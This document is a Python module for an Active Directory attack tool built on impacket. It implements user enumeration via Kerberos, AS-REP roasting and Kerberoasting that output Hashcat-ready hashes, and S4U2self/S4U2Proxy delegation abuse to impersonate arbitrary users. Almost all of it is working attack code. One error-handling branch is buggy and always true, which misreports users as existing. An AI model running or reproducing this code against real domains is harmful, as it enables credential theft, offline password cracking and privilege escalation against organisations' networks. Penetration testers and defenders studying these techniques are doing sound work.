import datetime
import random
import impacket
import struct
import os
from binascii import hexlify, unhexlify

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from impacket.krb5 import constants
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.asn1 import KERB_PA_PAC_REQUEST, AS_REQ, AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, seq_set, seq_set_iter, PA_FOR_USER_ENC, Ticket as TicketAsn1, EncTGSRepPart, PA_PAC_OPTIONS, KRB_ERROR
from impacket.krb5.kerberosv5 import sendReceive, KerberosError
from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_DONT_REQUIRE_PREAUTH
from impacket.ntlm import compute_lmhash, compute_nthash
from impacket.krb5.kerberosv5 import KerberosError
from impacket.krb5.crypto import Key, _enctype_table, _HMACMD5
from six import b

from utils.utils import open
from utils.output import Output

# Mostly taken from: https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py

class Kerberos:

    def __init__(self, hostname, domain, username='', password='', ntlm='', aesKey=''):
        self.hostname = hostname
        self.domain = domain
        self.__kdcHost = hostname

        self.username = username
        self.password = password
        if not ':' in ntlm:
            self.lmhash = 'aad3b435b51404eeaad3b435b51404ee'
            self.nthash = ntlm
        else:
            self.lmhash = ntlm.split(':')[0]
            self.nthash = ntlm.split(':')[-1]
        self.aesKey = aesKey

    def url(self):
        return 'krb://%s' % self.hostname

    def check_users_dump_asreq(self, ldap, username_file='nofile'):
        def file_gen(username_file):
            f = open(username_file)
            for username in f:
                username = username.strip()
                yield username
            f.close()

        def ldap_gen(ldap):
            username_list = []
            def yield_user(entry):
                username_list.append(entry['username'])

            ldap.list_users(callback=yield_user)

            for u in username_list:
                print(u)
                yield u

        if username_file != 'nofile':
            gen = file_gen(username_file)
        else:
            gen = ldap_gen(ldap)

        for username in gen:
            if ':' in username:
                username = username.split(':')[0]

            try:
                asreq = self.asrep_roasting(username)
                # Existing user !
                if '\\' in username:
                    d = username.split('\\')[0]
                    u = username.split('\\')[1]
                else:
                    d = self.domain
                    u = username
                yield {'username': u, 'domain': d, 'asreq': asreq}
            except Exception as e:
                if 'KDC_ERR_C_PRINCIPAL_UNKNOWN' in str(e):
                    # No user with that name
                    continue
                elif 'KDC_ERR_CLIENT_REVOKED':
                    # Existing user !
                    if '\\' in username:
                        d = username.split('\\')[0]
                        u = username.split('\\')[1]
                    else:
                        d = self.domain
                        u = username
                    yield {'username': u, 'domain': d}
                elif 'UF_DONT_REQUIRE_PREAUTH' in str(e):
                    # Existing user !
                    if '\\' in username:
                        d = username.split('\\')[0]
                        u = username.split('\\')[1]
                    else:
                        d = self.domain
                        u = username
                    yield {'username': u, 'domain': d}
                else:
                    raise e

    def asrep_roasting(self, userName, requestPAC=True):

        clientName = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        asReq = AS_REQ()

        domain = self.domain.upper()
        serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        pacRequest = KERB_PA_PAC_REQUEST()
        pacRequest['include-pac'] = requestPAC
        encodedPacRequest = encoder.encode(pacRequest)

        asReq['pvno'] = 5
        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

        asReq['padata'] = noValue
        asReq['padata'][0] = noValue
        asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        asReq['padata'][0]['padata-value'] = encodedPacRequest

        reqBody = seq_set(asReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.proxiable.value)
        reqBody['kdc-options'] = constants.encodeFlags(opts)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        seq_set(reqBody, 'cname', clientName.components_to_asn1)

        if domain == '':
            raise Exception('Empty Domain not allowed in Kerberos')

        reqBody['realm'] = domain

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['rtime'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)

        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)

        seq_set_iter(reqBody, 'etype', supportedCiphers)

        message = encoder.encode(asReq)

        try:
            r = sendReceive(message, domain, self.__kdcHost)
        except KerberosError as e:
            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                # RC4 not available, OK, let's ask for newer types
                supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
                seq_set_iter(reqBody, 'etype', supportedCiphers)
                message = encoder.encode(asReq)
                r = sendReceive(message, domain, self.__kdcHost)
            else:
                raise e

        # This should be the PREAUTH_FAILED packet or the actual TGT if the target principal has the
        # 'Do not require Kerberos preauthentication' set
        try:
            asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
        except:
            # Most of the times we shouldn't be here, is this a TGT?
            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
        else:
            # The user doesn't have UF_DONT_REQUIRE_PREAUTH set
            raise Exception('User %s doesn\'t have UF_DONT_REQUIRE_PREAUTH set' % userName)

        # Let's output the TGT enc-part/cipher in Hashcat format, in case somebody wants to use it.
        return '$krb5asrep$%d$%s@%s:%s$%s' % ( asRep['enc-part']['etype'], clientName, domain,
                                               hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
                                               hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())

    def getFromEnv(self):
        if os.getenv('KRB5CCNAME') == None:
            return None, None
        ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
        if ccache is None:
            return None, None

        self.domain = ccache.principal.realm['data'].decode('utf-8')

        creds = None
        """
        if target != '':
            principal = '%s@%s' % (target.upper(), domain.upper())
            creds = ccache.getCredential(principal)
        """

        TGT = None
        TGS = None
        if creds is None:
            principal = 'krbtgt/%s@%s' % (self.domain.upper(), self.domain.upper())
            creds = ccache.getCredential(principal)
            if creds is not None:
                TGT = creds.toTGT()
            else:
                pass
        else:
            TGS = creds.toTGS(principal)

        if self.username == '' and creds is not None:
            self.username = creds['client'].prettyPrint().split(b'@')[0].decode('utf-8')
        elif self.username == '' and len(ccache.principal.components) > 0:
            self.username = ccache.principal.components[0]['data'].decode('utf-8')

        return TGT, TGS

    def getTGT(self):
        TGT = None
        oldSessionKey = None
        sessionKey = None
        try:
            userName = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

            # In order to maximize the probability of getting session tickets with RC4 etype, we will convert the
            # password to ntlm hashes (that will force to use RC4 for the TGT). If that doesn't work, we use the
            # cleartext password.
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.password, self.domain,
                                                                    unhexlify(self.lmhash),
                                                                    unhexlify(self.nthash), self.aesKey,
                                                                    kdcHost=self.hostname)

            TGT = {}
            TGT['KDC_REP'] = tgt
            TGT['cipher'] = cipher
            TGT['sessionKey'] = sessionKey
            TGT['oldSessionKey'] = oldSessionKey
        except impacket.krb5.kerberosv5.KerberosError as e:
            if 'KRB_AP_ERR_SKEW' in str(e):
                Output.error("KRB_AP_ERR_SKEW received, please synchronize your time with the DC using : sudo ntpdate %s" % self.hostname)
            else:
                print("%s: %s" % (type(e), str(e)))
        except Exception as e:
            print("%s: %s" % (type(e), str(e)))

        return TGT

    def getTGS(self, spn, TGT):
        TGS = None
        oldSessionKey = None
        sessionKey = None
        try:
            serverName = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)

            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.domain,
                                                                    self.hostname,
                                                                    TGT['KDC_REP'], TGT['cipher'],
                                                                    TGT['sessionKey'])

            TGS = {}
            TGS['KDC_REP'] = tgs
            TGS['cipher'] = cipher
            TGS['sessionKey'] = sessionKey
            TGS['oldSessionKey'] = oldSessionKey
        except impacket.krb5.kerberosv5.KerberosError as e:
            if 'KRB_AP_ERR_SKEW' in str(e):
                Output.error("KRB_AP_ERR_SKEW received, please synchronize your time with the DC using : sudo ntpdate %s" % self.hostname)
            else:
                print("%s: %s" % (type(e), str(e)))
        except Exception as e:
            print("%s: %s" % (type(e), str(e)))

        return TGS

    def TGStoHashcat(self, TGS, username, spn):
        decodedTGS = decoder.decode(TGS['KDC_REP'], asn1Spec=TGS_REP())[0]

        # According to RFC4757 the cipher part is like:
        # struct EDATA {
        #       struct HEADER {
        #               OCTET Checksum[16];
        #               OCTET Confounder[8];
        #       } Header;
        #       OCTET Data[0];
        # } edata;
        #
        # In short, we're interested in splitting the checksum and the rest of the encrypted data
        #
        output = None
        if decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:  # 23
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            output = {
                'format': 'Kerberos 5 TGS-REP',
                'tgs': entry.strip(),
            }
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:  # 17
            entry = '$krb5tgs$%d$%s$%s$%s$%s' % (
                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'],
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
            output = {
                'format': 'Kerberos 5 TGS-REP',
                'tgs': entry.strip(),
            }
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:  # 18
            entry = '$krb5tgs$%d$%s$%s$%s$%s' % (
                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'],
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
            output = {
                'format': 'Kerberos 5 TGS-REP',
                'tgs': entry.strip(),
            }
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:  # 3
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.des_cbc_md5.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            output = {
                'format': 'Kerberos 5 TGS-REP',
                'tgs': entry.strip(),
            }
        else:
            print('Skipping %s/%s due to incompatible e-type %d' % (
                decodedTGS['ticket']['sname']['name-string'][0], decodedTGS['ticket']['sname']['name-string'][1],
                decodedTGS['ticket']['enc-part']['etype']))

        return output

    def saveTGT(self, TGT, ticket_file):
        tgt = TGT['KDC_REP']
        oldSessionKey = TGT['oldSessionKey']
        ccache = CCache()

        ccache.fromTGT(tgt, oldSessionKey, oldSessionKey)
        ccache.saveFile(ticket_file)

    def saveTGS(self, TGS, ticket_file):
        tgs = TGS['KDC_REP']
        oldSessionKey = TGS['oldSessionKey']
        ccache = CCache()

        ccache.fromTGS(tgs, oldSessionKey, oldSessionKey)
        ccache.saveFile(ticket_file)


    def do_S4U(self,spn,  TGT, impersonate):
        tgt = TGT['KDC_REP']
        cipher = TGT['cipher']
        oldSessionKey = TGT['oldSessionKey']
        sessionKey = TGT['sessionKey']
        kdcHost = self.hostname
        domain =  self.domain
        user = self.username
        decodedTGT = decoder.decode(tgt, asn1Spec = AS_REP())[0]

        # Extract the ticket from the TGT
        ticket = Ticket()
        ticket.from_asn1(decodedTGT['ticket'])

        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] =  constants.encodeFlags(opts)
        seq_set(apReq,'ticket', ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decodedTGT['crealm'])

        clientName = Principal()
        clientName.from_asn1( decodedTGT, 'crealm', 'cname')

        seq_set(authenticator, 'cname', clientName.components_to_asn1)

        now = datetime.datetime.utcnow()
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 7
        # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
        # TGS authenticator subkey), encrypted with the TGS session
        # key (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        encodedApReq = encoder.encode(apReq)

        tgsReq = TGS_REQ()

        tgsReq['pvno'] =  5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)

        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq['padata'][0]['padata-value'] = encodedApReq

        # In the S4U2self KRB_TGS_REQ/KRB_TGS_REP protocol extension, a service
        # requests a service ticket to itself on behalf of a user. The user is
        # identified to the KDC by the user's name and realm.
        clientName = Principal(impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        S4UByteArray = struct.pack('<I',constants.PrincipalNameType.NT_PRINCIPAL.value)
        S4UByteArray += b(impersonate) + b(domain) + b'Kerberos'

        # Finally cksum is computed by calling the KERB_CHECKSUM_HMAC_MD5 hash
        # with the following three parameters: the session key of the TGT of
        # the service performing the S4U2Self request, the message type value
        # of 17, and the byte array S4UByteArray.
        checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)

        paForUserEnc = PA_FOR_USER_ENC()
        seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)
        paForUserEnc['userRealm'] = domain
        paForUserEnc['cksum'] = noValue
        paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)
        paForUserEnc['cksum']['checksum'] = checkSum
        paForUserEnc['auth-package'] = 'Kerberos'

        encodedPaForUserEnc = encoder.encode(paForUserEnc)

        tgsReq['padata'][1] = noValue
        tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)
        tgsReq['padata'][1]['padata-value'] = encodedPaForUserEnc

        reqBody = seq_set(tgsReq, 'req-body')

        opts = list()
        opts.append( constants.KDCOptions.forwardable.value )
        opts.append( constants.KDCOptions.renewable.value )
        opts.append( constants.KDCOptions.canonicalize.value )

        reqBody['kdc-options'] = constants.encodeFlags(opts)

        serverName = Principal(user, type=constants.PrincipalNameType.NT_UNKNOWN.value)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        reqBody['realm'] = str(decodedTGT['crealm'])

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)
        seq_set_iter(reqBody, 'etype',
                      (int(cipher.enctype),int(constants.EncryptionTypes.rc4_hmac.value)))

        Output.highlight({'target': self.url(), 'message': "Requesting S4U2self"})
        message = encoder.encode(tgsReq)

        r = sendReceive(message, domain, kdcHost)

        tgs = decoder.decode(r, asn1Spec = TGS_REP())[0]

        ################################################################################
        # Up until here was all the S4USelf stuff. Now let's start with S4U2Proxy
        # So here I have a ST for me.. I now want a ST for another service
        # Extract the ticket from the TGT
        ticketTGT = Ticket()
        ticketTGT.from_asn1(decodedTGT['ticket'])

        ticket = Ticket()
        ticket.from_asn1(tgs['ticket'])

        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] =  constants.encodeFlags(opts)
        seq_set(apReq,'ticket', ticketTGT.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decodedTGT['crealm'])

        clientName = Principal()
        clientName.from_asn1( decodedTGT, 'crealm', 'cname')

        seq_set(authenticator, 'cname', clientName.components_to_asn1)

        now = datetime.datetime.utcnow()
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 7
        # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
        # TGS authenticator subkey), encrypted with the TGS session
        # key (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        encodedApReq = encoder.encode(apReq)

        tgsReq = TGS_REQ()

        tgsReq['pvno'] = 5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq['padata'][0]['padata-value'] = encodedApReq

        # Add resource-based constrained delegation support
        paPacOptions = PA_PAC_OPTIONS()
        paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))

        tgsReq['padata'][1] = noValue
        tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value
        tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)

        reqBody = seq_set(tgsReq, 'req-body')

        opts = list()
        # This specified we're doing S4U
        opts.append(constants.KDCOptions.cname_in_addl_tkt.value)
        opts.append(constants.KDCOptions.canonicalize.value)
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)

        reqBody['kdc-options'] = constants.encodeFlags(opts)
        service2 = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
        seq_set(reqBody, 'sname', service2.components_to_asn1)
        reqBody['realm'] = domain

        myTicket = ticket.to_asn1(TicketAsn1())
        seq_set_iter(reqBody, 'additional-tickets', (myTicket,))

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)
        seq_set_iter(reqBody, 'etype',
                         (
                             int(constants.EncryptionTypes.rc4_hmac.value),
                             int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
                             int(constants.EncryptionTypes.des_cbc_md5.value),
                             int(cipher.enctype)
                         )
                     )
        message = encoder.encode(tgsReq)

        Output.highlight({'target': self.url(), 'message': "Requesting S4U2Proxy"})
        r = sendReceive(message, domain, kdcHost)

        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]

        cipherText = tgs['enc-part']['cipher']

        # Key Usage 8
        # TGS-REP encrypted part (includes application session
        # key), encrypted with the TGS session key (Section 5.4.2)
        plainText = cipher.decrypt(sessionKey, 8, cipherText)

        encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]

        newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])

        # Creating new cipher based on received keytype
        cipher = _enctype_table[encTGSRepPart['key']['keytype']]

        TGS = {}
        TGS['KDC_REP'] = r
        TGS['cipher'] = cipher
        TGS['sessionKey'] = newSessionKey
        TGS['oldSessionKey'] = sessionKey
        return TGS


